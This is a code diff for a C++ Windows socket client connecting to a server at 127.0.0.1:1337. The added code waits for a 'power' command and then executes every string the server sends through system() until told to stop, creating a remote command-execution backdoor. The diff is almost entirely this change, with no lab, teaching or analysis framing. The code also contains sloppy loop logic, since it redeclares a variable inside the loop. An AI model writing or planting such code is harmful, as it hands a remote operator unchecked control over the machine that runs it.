@@ -1,13 +1,15 @@
 #include <iostream>
 #include<ctime>
 #include <string>
+#include<string.h>
 #include <WS2tcpip.h>
+#include <cstdlib>
 #include<Windows.h>
 #pragma comment(lib, "ws2_32.lib")
 
 using namespace std;
 
-void main()
+int main()
 {
 	string ipAddress = "127.0.0.1";			// IP Address of the server
 	int port = 1337;						// Listening port # on the server
@@ -49,32 +51,42 @@ void main()
 
 	// Do-while loop to send and receive data
 	char buf[4096];
+	char p[] = "power";
+	char e_power[] = "exit_power";
+	char e_of_server[] = "exit_of_server";
 	string userInput;
-
-
-
-	cout << "Enter your name > " << endl;
-	cin >> userInput;
-	if (userInput.size() > 0)		// Make sure the user has typed in something
-	{
-
-		// Send the text
-		int sendResult = send(sock, userInput.c_str(), userInput.size(), 0);
-		if (sendResult != SOCKET_ERROR)
-		{
-
-			// Wait for response
-
-		}
-	}
 
 	ZeroMemory(buf, 4096);
 	int bytesReceived = recv(sock, buf, 4096, 0);
 
-	if (bytesReceived > 0)
+	while (strcmp(buf, e_of_server) != 0)
 	{
-		cout << buf << endl << "*";
+
+		if (bytesReceived > 0)
+		{
+			if (strcmp(buf, p) == 0)
+			{
+				while (strcmp(buf, e_power) != 0)
+				{
+					ZeroMemory(buf, 4096);
+					int bytesReceived = recv(sock, buf, 4096, 0);
+					system(buf);
+
+
+				}
+
+			}
+
+			ZeroMemory(buf, 4096);
+			int bytesReceived = recv(sock, buf, 4096, 0);
+
+		}
+
 	}
+
+
+
+
 
 
 	// Gracefully close down everything
